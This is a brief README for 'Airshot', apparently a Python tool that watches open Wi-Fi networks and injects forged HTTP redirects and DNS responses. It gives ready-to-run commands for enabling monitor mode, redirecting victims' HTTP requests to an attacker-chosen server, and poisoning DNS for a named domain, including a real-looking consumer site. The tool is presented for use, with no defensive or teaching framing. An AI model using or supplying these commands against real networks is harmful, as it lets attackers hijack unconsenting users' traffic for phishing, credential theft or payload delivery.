# Airshot

Just a basic script that will look for HTTP requests in open networks and inject HTTP redirects



### Directions
```bash
sudo airmon-ng start <interface>

#Redirecting HTTP Requests
python3 airshot.py -i <interface> -c <channel> -ip <redirected_server_ip> --http true

#DNS Poisioning
python3 airshot.py -i <interface> -c <channel> -ip <redirected_server_ip> --domain <domain_to_poision
```


### Examples
Redirecting HTTP GET Requests to 192.168.16.102
```bash
python3 airshot.py -i wlan0mon -c 9 -ip 192.168.16.102 --http true
```

DNS poisioning for www.example.com to resolve to 192.168.16.102
```bash
python3 airshot.py -i wlan0mon -c 9 -ip 192.168.16.102 --domain www.spectrum.com
```


